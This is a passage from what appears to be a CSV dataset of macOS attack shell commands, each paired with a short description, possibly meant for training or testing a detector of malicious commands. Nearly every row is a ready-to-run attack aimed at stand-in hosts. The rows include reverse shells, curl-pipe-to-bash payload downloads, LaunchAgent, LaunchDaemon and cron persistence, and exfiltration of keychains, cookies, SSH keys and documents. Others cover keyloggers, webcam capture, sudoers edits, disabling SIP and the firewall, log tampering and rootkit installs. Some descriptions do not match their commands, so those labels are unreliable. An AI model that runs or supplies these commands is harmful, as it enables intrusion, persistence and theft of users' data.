		<string>/usr/bin/curl</string>
		<string>-fsSL</string>
		<string>http://malicious-url.com/payload.sh</string>
		<string>|</string>
		<string>/bin/bash</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Creating a persistent launch agent for command execution."
"curl -s http://legitimate-url.com/update.sh | sed 's/legitimate_command/malicious_command/' | bash","Trojanizing a software update process."
"chmod +s /usr/local/bin/unauthorized_executable","Privilege escalation by altering file permissions to grant executable rights to an unauthorized file."
"echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' > ~/Library/LaunchAgents/com.startup.login.plist && launchctl load ~/Library/LaunchAgents/com.startup.login.plist","Persistence mechanism through a script that executes on system startup."
"osascript -e 'tell application ""System Events"" to make login item at end with properties {path:""/path/to/malicious/script"", hidden:false}'","Persistence via scripting addition that loads a malicious script at login."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.keylogger</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/local/bin/keylogger</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.keylogger.plist && launchctl load ~/Library/LaunchAgents/com.malicious.keylogger.plist","Persistence via malicious plist to maintain access and execute a keylogger on system startup."
"curl -o ~/Library/.hidden_keylogger http://malicious-url.com/keylogger && chmod +x ~/Library/.hidden_keylogger && ~/Library/.hidden_keylogger &","Downloading a keylogger application from a remote server and executing it without user consent."
"nohup bash -c 'while :; do cat /dev/input/event0 | nc attacker.com 4444; sleep 10; done' &","Injecting a keylogger process into the system to capture keystrokes and send them to a remote attacker."
"echo 'cat ~/.ssh/id_rsa >> /tmp/ssh_keylog' > ~/.ssh/rc","Persistence via SSH keylogger installation"
"ssh -N -f -L 9999:localhost:22 malicious_user@victim.com","Establishing unauthorized port forwarding"
"ssh -A malicious_user@victim.com 'ssh-add -l > /tmp/forwarded_keys'","Abusing SSH agent forwarding to gain access"
"hdiutil mount fakeapp.dmg && cp -R /Volumes/FakeApp/FakeApp.app /Applications/ && xattr -d com.apple.quarantine /Applications/FakeApp.app && open /Applications/FakeApp.app","Malware installation via a trojanized application downloaded from a phishing site."
"curl -o ~/Library/Caches/hidden_script.sh http://malicious-ads.com/script.sh && chmod +x ~/Library/Caches/hidden_script.sh && ~/Library/Caches/hidden_script.sh","Execution of a script that was disguised as an advertisement but downloads and executes a malicious payload."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.agent</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-o</string>
		<string>/tmp/malicious</string>
		<string>http://malicious-url.com/malware</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence via malicious plist after remote code execution."
"osascript -e 'tell application ""System Events"" to make new login item at end with properties {path:""/path/to/malicious/script.sh"", hidden:false}'","Persistence mechanism by adding a script to Login Items that executes every time the user logs in."
"/usr/bin/find / -perm +a -exec ls -le {} \;","Identification of files with suspicious ACL permissions that could indicate tampering."
"find ~/Documents/Confidential -type f -exec uuencode {} {} \; | mail -s 'Confidential Documents' attacker@example.com","Exfiltration of confidential documents from a macOS system using the mail command."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.daemon</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/osascript</string>
		<string>-e</string>
		<string>do shell script ""curl -fsSL http://malicious-url.com/payload.sh | bash"" with administrator privileges</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchDaemons/com.malicious.daemon.plist && launchctl load ~/Library/LaunchDaemons/com.malicious.daemon.plist","Persistence via scripting additions using a malicious Launch Daemon plist file."
"ps aux | grep -v 'security_tool' > /tmp/hidden_process_list.txt","Malicious actors may attempt to enumerate running processes to identify security tools or vulnerable applications they can exploit."
"sudo tcpdump -i en0 -w unauthorized_capture.pcap","Monitoring network traffic and capturing packets without authorization."
"arpspoof -i en0 -t target_ip gateway_ip","Intercepting and altering network packets to conduct ARP poisoning attacks."
"arp -s gateway_ip malicious_ip","Manipulating the ARP cache to associate a malicious IP address with the MAC address of the gateway."
"crontab -l | { cat; echo ""* * * * * /path/to/malicious/script.sh""; } | crontab -","Persistence through modifying an existing cron job to execute a malicious script."
"ps aux","A command that enumerates all running processes and their respective owners in a macOS system."
"while :; do :; done","A shell command designed to consume all available CPU resources on a macOS system."
"dd if=/dev/zero of=~/stuffed_disk_file bs=1m","A command that generates a large file to consume all remaining free disk space on a macOS system."
"sudo defaults write /Library/Preferences/com.malicious.extension.plist ProgramArguments -array-add /path/to/malicious/extension.kext && sudo chown root:wheel /Library/Preferences/com.malicious.extension.plist && sudo chmod 644 /Library/Preferences/com.malicious.extension.plist && sudo launchctl load /Library/Preferences/com.malicious.extension.plist","Persistence via malicious plist file that loads a kernel extension."
"sqlite3 ~/Library/Application\ Support/Google/Chrome/Default/Cookies 'select * from cookies;' > /tmp/chrome_cookies.txt && scp /tmp/chrome_cookies.txt attacker@malicious-server.com:/stolen_data/","Exfiltrating sensitive browser session data from a macOS system."
"echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' >> ~/.bash_profile && source ~/.bash_profile","Establishing a reverse shell to maintain remote access on a macOS machine."
"networksetup -setwebproxy Wi-Fi attacker-proxy.com 8080 && networksetup -setsecurewebproxy Wi-Fi attacker-proxy.com 8080","Altering system network configurations to redirect traffic through a malicious proxy."
"/usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate off","Modifying firewall settings to allow all incoming connections on a macOS system."
"osascript -e 'do shell script ""curl -s http://malicious-url.com/install.sh | sh"" with administrator privileges'","Malware installation via a disguised email attachment that appears legitimate but executes a script when opened."
"curl -s http://malicious-url.com/keylogger.sh | bash","Exfiltrating sensitive data through a keylogger installed via a malicious Bash script."
"ps -A > /tmp/usage.txt && curl -T /tmp/usage.txt ftp://attacker.com --user username:password","Recording application usage statistics and sending them to a remote server."
"top -l 1 | grep 'Processes' -A 10 > /tmp/resource_usage.txt && nc -w 3 attacker.com 5555 < /tmp/resource_usage.txt","Monitoring resource usage by applications and exfiltrating the data."
"curl -s http://example.com/fakeImage.jpg --output - | sh","Malware installation using a disguised script that appears benign."
"osascript -e 'Tell application ""System Events"" to display dialog ""Please enter your password:"" default answer """" with hidden answer'","Phishing attack script that prompts users for their credentials."
"python -c 'import socket, subprocess, os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((""attacker.com"",1234)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([""/bin/sh"",""-i""]);'","Keylogging script that captures and sends keystrokes to a remote server."
"cat ~/Library/Application\ Support/Google/Chrome/Default/Cookies | nc -w 3 attacker.com 5555","Browser session hijacking by extracting cookies from the default browser."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.agent</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-o</string>
		<string>/tmp/backdoor.sh</string>
		<string>http://malicious-url.com/backdoor.sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence via launch agents to maintain remote access after system reboots."
"osascript -e 'tell application ""System Events"" to make new login item at end with properties {path:""/Applications/Backdoor.app"", hidden:false}'","Adding a login item to execute a script that establishes a backdoor."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>\n<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">\n<plist version=""1.0"">\n<dict>\n	<key>Label</key>\n	<string>com.malicious.payload</string>\n	<key>ProgramArguments</key>\n	<array>\n		<string>/usr/bin/curl</string>\n		<string>-o</string>\n		<string>/tmp/payload</string>\n		<string>http://malicious-url.com/payload</string>\n		<string>&&</string>\n		<string>chmod</string>\n		<string>+x</string>\n		<string>/tmp/payload</string>\n		<string>&&</string>\n		<string>/tmp/payload</string>\n	</array>\n	<key>RunAtLoad</key>\n	<true/>\n	<key>KeepAlive</key>\n	<true/>\n</dict>\n</plist>' | sudo tee /Library/LaunchDaemons/com.malicious.payload.plist && sudo launchctl load /Library/LaunchDaemons/com.malicious.payload.plist","Persistence via malicious plist to execute a payload with root privileges on a macOS system."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.reverse</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/sh</string>
		<string>-c</string>
		<string>bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.reverse.plist && launchctl load ~/Library/LaunchAgents/com.malicious.reverse.plist","Persistence via malicious plist to establish a reverse shell."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.reverse</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/bash</string>
		<string>-c</string>
		<string>bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.reverse.plist && launchctl load ~/Library/LaunchAgents/com.malicious.reverse.plist","Persistence via malicious plist to establish a reverse shell on system boot."
"log stream --predicate 'eventMessage contains ""authentication""' --info","Tracking user authentication events by monitoring security logs in macOS."
"echo 'while true; do log show --predicate ""eventMessage contains \""user\"""" --info & sleep 60; done' >> /etc/profile","Establishing persistence to monitor user activity by appending a script to the global initialization file."
"echo 'echo <password> | sudo -Sv && sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.taskgated.plist' >> ~/.bash_profile","Escalating user privileges to monitor system-wide events without restrictions."
"while true; do screencapture -x ~/Desktop/screenshot-$(date +%Y%m%d%H%M%S).png; sleep 300; done","Capturing screenshots periodically to monitor user activity."
"cp ~/.ssh/id_rsa /Volumes/USB/id_rsa_backup && scp /Volumes/USB/id_rsa_backup attacker@malicious-server.com:~/stolen_keys/","Persistence via SSH key theft from a macOS system."
"Automated screen capture and exfiltration using macOS screencapture command and scp.","A scenario where an attacker automates screen captures on a macOS system and exfiltrates the data."
"Integration of keylogging through event taps using macOS Quartz event services.","Describe a method for integrating keylogging functionality into a macOS system."
"Malicious use of remote access tools with keylogging by installing and configuring a RAT with key capture capabilities.","Show how remote access tools with keylogging features can be used maliciously on macOS."
"security dump-keychain -d login.keychain-db | nc -w 3 attacker.com 4444","Data exfiltration of the user's entire keychain database to a remote server."
"echo '* * * * * /bin/bash -i >& /dev/tcp/attacker.com/5555 0>&1' >> ~/Library/Crontab","Setting up remote access by installing a reverse shell in the system's crontab."
"networksetup -setwebproxy Wi-Fi attacker-proxy.com 8080 && networksetup -setsecurewebproxy Wi-Fi attacker-proxy.com 8080","Manipulation of system network configurations to redirect all traffic through an attacker-controlled proxy."
"sed -i '' 's/remote myvpn.com 1194/remote attacker-vpn.com 1194/' /etc/openvpn/myvpn.ovpn","Tampering with VPN configuration files to route all traffic to an attacker-controlled server."
"zip -r ~/Documents.zip ~/Documents && openssl enc -aes-256-cbc -salt -in ~/Documents.zip -out ~/Documents.enc -k password && curl --upload-file ~/Documents.enc https://remote-server.com/upload","Automatic exfiltration of documents from a macOS system to a remote server using a shell script."
"echo 'int main() { char large_string[128]; int i; for(i = 0; i < 300; i++) large_string[i] = 'A'; printf(""%s"", large_string); return 0; }' > exploit.c && gcc exploit.c -o exploit && chmod +x exploit && ./exploit","Privilege escalation on macOS by exploiting a buffer overflow vulnerability in a privileged service."
"echo ""* * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'"" | crontab -","Privilege escalation by injecting a script into crontab to execute every minute."
"script -q /dev/null | nc -l 4444 > keystrokes.log &","Capturing and exfiltrating user keystrokes to a remote server on a macOS system."
"ps aux | grep -v grep | grep 'hidden_process_name'","Identifying hidden processes by altering the appearance of the process list."
"osascript -e 'tell application ""System Events"" to make new login item at end with properties {path:""/Applications/Utilities/Terminal.app"", hidden:false}'","A script that adds an unauthorized login item for persistent access."
"curl -s http://malicious-url.com/install.sh | /bin/bash","Malware installation through a disguised Bash script downloaded from a remote server."
"mv /path/to/trusted-binary /path/to/trusted-binary.bak && curl -o /path/to/trusted-binary http://malicious-url.com/trojan && chmod +x /path/to/trusted-binary","Trojan application execution by replacing an existing trusted binary."
"mkdir /var/.hidden && curl -o /var/.hidden/rootkit http://malicious-url.com/rootkit && echo 'if [ -f /var/.hidden/rootkit ]; then /var/.hidden/rootkit; fi' >> /etc/rc.common","Rootkit embedding using a hidden directory and modifying system files to load the rootkit during boot."
"sed -i '' '/suspicious-command/d' /var/log/system.log","System log alteration to remove evidence of unauthorized access."
"curl http://malicious-url.com/rootkit.tar.gz -o /tmp/rootkit.tar.gz && tar -xzf /tmp/rootkit.tar.gz -C /tmp && cd /tmp/rootkit && make && make install","Embedding a rootkit into the system to intercept and modify system calls."
"0 * * * * /usr/bin/curl -fsSL http://malicious-url.com/script.sh | /bin/bash","Persistence via malicious cron job that downloads and executes a script every hour."
"<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.malicious.reverse</string>
 <key>ProgramArguments</key>
 <array>
 <string>/bin/bash</string>
 <string>-c</string>
 <string>/bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
 </array>
 <key>RunAtLoad</key>
 <true/>
</dict>
</plist>","Establishing a reverse shell using launchd to maintain access to a macOS system."
"<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.malicious.startup</string>
 <key>ProgramArguments</key>
 <array>
 <string>/usr/bin/osascript</string>
 <string>-e</string>
 <string>do shell script ""launchctl load /Library/LaunchDaemons/com.malicious.plist"" with administrator privileges</string>
 </array>
 <key>RunAtLoad</key>
 <true/>
</dict>
</plist>","Daemon plist file modification to execute arbitrary code at system startup."
"echo 'Jan 01 00:00:00 localhost fake_process[12345]: fake message' >> /var/log/system.log","Log file tampering by appending misleading information to system logs."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.user.activitylogger</string>
 <key>ProgramArguments</key>
 <array>
 <string>/usr/bin/script</string>
 <string>-q</string>
 <string>/tmp/activity.log</string>
 <string>osascript -e</string>
 <string>\""tell application \""System Events\"" to get name of every process where background only is false\""</string>
 </array>
 <key>StartInterval</key>
 <integer>300</integer>
</dict>
</plist>' > ~/Library/LaunchAgents/com.user.activitylogger.plist && launchctl load ~/Library/LaunchAgents/com.user.activitylogger.plist","Persistence via malicious plist to log user activity every 5 minutes"
"cp ~/Library/Safari/History.db /tmp/history.db && sqlite3 /tmp/history.db 'select url from history_items;' | curl -F 'file=@/tmp/history.db' http://malicious-url.com/upload","Exfiltrating browser history from Safari"
"top -l 1 | grep 'Processes' -A 10 > /tmp/app_usage.log && curl --upload-file /tmp/app_usage.log http://malicious-url.com/upload","Capturing and logging application usage statistics"
"ps aux | grep -v malicious_process_name > /tmp/clean_process_list; mv /tmp/clean_process_list /var/run/proc_list","Malicious shell command in macOS systems to hide a process from the process list."
"curl http://malicious-url.com/rootkit -o /tmp/.hidden_rootkit && chmod +x /tmp/.hidden_rootkit && /tmp/.hidden_rootkit","Embedding a rootkit to maintain unauthorized access to a macOS system."
"csrutil disable","Bypassing System Integrity Protection to allow modifications to protected parts of macOS."
"nvram boot-args=""rootless=0 kext-dev-mode=1""","Manipulating the boot process to execute unauthorized code at startup."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.reverse.shell</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/bash</string>
		<string>-c</string>
		<string>bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.reverse.shell.plist && launchctl load ~/Library/LaunchAgents/com.reverse.shell.plist","Persistence via malicious plist to establish a reverse shell on system startup."
"echo 'while :; do nc -l 4444 -e /bin/sh; done &' > /tmp/backdoor.sh && chmod +x /tmp/backdoor.sh && echo '@reboot /tmp/backdoor.sh' | crontab -","Establishing a backdoor on a macOS system to allow remote access and monitor user activity."
"echo '* * * * * imagesnap -q ~/Pictures/webcam-$(date +%Y%m%d%H%M%S).jpg && curl -T ~/Pictures/webcam-*.jpg ftp://attacker.com/uploads/' | crontab -","Installing a script to periodically capture webcam snapshots and upload them to a remote server."
"echo 'nohup logkeys --start --output ~/.hidden/log.txt & echo ""*/30 * * * * curl --upload-file ~/.hidden/log.txt ftp://attacker.com/keylogs/"" | crontab -' > /tmp/keylogger.sh && chmod +x /tmp/keylogger.sh && /tmp/keylogger.sh","Creating a hidden file to log keystrokes and periodically send the logs to a remote attacker."
"sudo tcpdump -i any -w ~/Desktop/network_traffic.pcap","Intercepting and logging all incoming and outgoing network packets on a macOS system."
"sudo -u#-1 /bin/bash","Privilege escalation by exploiting sudo misconfigurations related to CVE-2019-14287."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.backdoor</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-L</string>
		<string>http://malicious-url.com/backdoor</string>
		<string>|</string>
		<string>/bin/bash</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.backdoor.plist && launchctl load ~/Library/LaunchAgents/com.malicious.backdoor.plist","Persistence via malicious plist file to maintain remote access."
"while read -r line; do screencapture -x ~/Desktop/screenshot-$(date '+%Y%m%d%H%M%S').png; done < <(log stream --predicate 'eventMessage contains ""KeyDown""')","A scenario where a keylogger is implemented to capture keystrokes and a screen capture is taken each time a certain key is pressed."
"launchctl submit -l com.user.logclipboard -- /bin/bash -c 'prev_pb=""$(pbpaste)""; while sleep 1; do curr_pb=""$(pbpaste)""; if [[ ""$curr_pb"" != ""$prev_pb"" ]]; then screencapture -x ~/Desktop/clipboard-$(date '+%Y%m%d%H%M%S').png; prev_pb=""$curr_pb""; fi; done'","A method to capture the desktop when the clipboard content changes."
"find ~/Documents -type f -name '*.pdf' -exec echo {} \; -exec uuencode {} {}.uu \; | mail -s 'Sensitive Documents' attacker@example.com","Data exfiltration by sending email attachments of sensitive files detected using file pattern matching."
"curl -s http://malvertising-network.com/installer.sh | sh","Malware installation via a drive-by download initiated by a malicious advertising script from a malvertising network."
"osascript -e 'tell application ""System Events"" to make login item at end with properties {path:""/Applications/malicious.app"", hidden:false}'","Persistence via login item added to a user's session."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.agent</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-s</string>
		<string>http://malicious-url.com/payload.sh</string>
		<string>|</string>
		<string>/bin/bash</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Creating a launch agent for command execution at user login."
"sudo echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.daemon</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/sh</string>
		<string>-c</string>
		<string>""bash -i >& /dev/tcp/attacker.com/4444 0>&1""</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
	<key>KeepAlive</key>
	<true/>
</dict>
</plist>' | sudo tee /Library/LaunchDaemons/com.malicious.daemon.plist && sudo launchctl load /Library/LaunchDaemons/com.malicious.daemon.plist","Establishing a persistent backdoor via LaunchDaemon."
"tcpdump -i en0 -w /tmp/capture.pcap && openssl enc -aes-256-cbc -in /tmp/capture.pcap -out /tmp/encrypted-capture.enc -pass pass:SecretPassword && curl --upload-file /tmp/encrypted-capture.enc https://attacker-controlled-server.com/upload","Capturing network traffic and exfiltrating sensitive data through an encrypted channel."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.loginitem</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-s</string>
		<string>http://malicious-url.com/payload</string>
		<string>|</string>
		<string>/bin/bash</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.loginitem.plist && launchctl load ~/Library/LaunchAgents/com.malicious.loginitem.plist","Persistence via malicious login item added to a user's LaunchAgents directory."
"echo 'ALL ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers","Privilege escalation by exploiting sudo misconfigurations that allow executing commands as root without a password."
"0 0 1 * * zip -r /tmp/documents.zip ~/Documents && curl --upload-file /tmp/documents.zip http://malicious-server.com/upload && rm /tmp/documents.zip","Persistence mechanism using a cron job for monthly data exfiltration of user documents to a remote server."
"crontab -l | { cat; echo ""* * * * * echo 'MALICIOUS_CODE' | sudo -S sh""; } | crontab -","Injecting malicious code into existing cron jobs to gain persistent elevated privileges."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.agent</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/sh</string>
		<string>-c</string>
		<string>bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence via malicious plist file that is loaded as a Launch Agent to execute a reverse shell every time the user logs in."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.plist</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-o</string>
		<string>/tmp/malicious.sh</string>
		<string>http://malicious-url.com/malicious.sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.plist && launchctl load ~/Library/LaunchAgents/com.malicious.plist","Persistence via malicious plist in LaunchAgents to execute code at login"
"echo 'int main() { setuid(0); system(""/bin/sh""); return 0; }' > /tmp/preload.c && gcc -o /tmp/preload.so -shared -fPIC /tmp/preload.c && sudo LD_PRELOAD=/tmp/preload.so /usr/bin/env","Privilege escalation by exploiting sudo misconfigurations that allow environment variable manipulation."
"find / -type f -name '.*' -mmin -5","Detecting hidden file alterations in the system directories."
"DYLD_INSERT_LIBRARIES=/path/to/malicious/library.dylib /path/to/privileged/app","Injecting code into privileged processes can be achieved by creating a malicious dynamic library and replacing a legitimate one to hijack a privileged process."
"echo 'int main() { system(""launchctl load /Library/LaunchDaemons/com.malicious.plist""); return 0; }' > hijack.c && gcc -dynamiclib hijack.c -o /usr/local/lib/hijack.dylib && export DYLD_LIBRARY_PATH=/usr/local/lib/","Dylib hijacking involves placing a malicious dylib file in a location where the system or applications will load it before the legitimate library."
"codesign --sign - --force --deep /path/to/malicious/app","Code signing bypass techniques can be used to execute unsigned code on macOS systems, which may allow an attacker to run malicious code with elevated privileges."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.agent</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-o</string>
		<string>/tmp/malicious.sh</string>
		<string>http://malicious-url.com/payload.sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence via malicious plist in launch agents"
"stat -f '%Sa %N' /path/to/sensitive/file","Identifying unauthorized file access by monitoring file access timestamps in macOS."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.agent</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-s</string>
		<string>http://malicious-url.com/payload</string>
		<string>|</string>
		<string>/bin/bash</string>
		<string>-</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence via malicious plist to maintain remote access."
"echo ""* * * * * /usr/bin/curl http://malicious-url.com/payload.sh | /bin/bash"" | crontab -","Persistence mechanism by adding a cron job to execute a script every minute."
"sudo cp -a /path/to/malicious_extension.kext /Library/Extensions/ && sudo kextload /Library/Extensions/malicious_extension.kext","Persistence mechanism using a malicious kernel extension loaded on startup."
"osascript -e 'tell application ""System Events"" to make new login item at end with properties {path:""/path/to/malicious_script.sh"", hidden:false}'","Adding a login item to execute a script when the user logs in."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>\n<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">\n<plist version=""1.0"">\n<dict>\n <key>Label</key>\n <string>com.malicious.daemon</string>\n <key>ProgramArguments</key>\n <array>\n <string>/bin/sh</string>\n <string>-c</string>\n <string>/bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>\n </array>\n <key>RunAtLoad</key>\n <true/>\n</dict>\n</plist>' > /Library/LaunchDaemons/com.malicious.daemon.plist && launchctl load /Library/LaunchDaemons/com.malicious.daemon.plist","Creating a launch daemon that triggers a reverse shell on system boot."
"zip -r sensitive_files.zip ~/Documents/SensitiveData","Compressing sensitive files into an archive before exfiltration."
"hdiutil create -srcfolder sensitive_files.zip -volname 'Hidden Data' hidden_image.dmg && cat hidden_image.dmg >> innocent-looking-image.jpg","Hiding the compressed file in the metadata of an image."
"exiftool -v innocent-looking-image.jpg","Detecting anomalies in image metadata that could indicate hidden data."
"while true; do screencapture -x ~/Desktop/screenshot.png; curl -T ~/Desktop/screenshot.png ftp://malicious-ftp-server.com/uploads/; sleep 300; done","Automating screen capture and uploading to a cloud storage service."
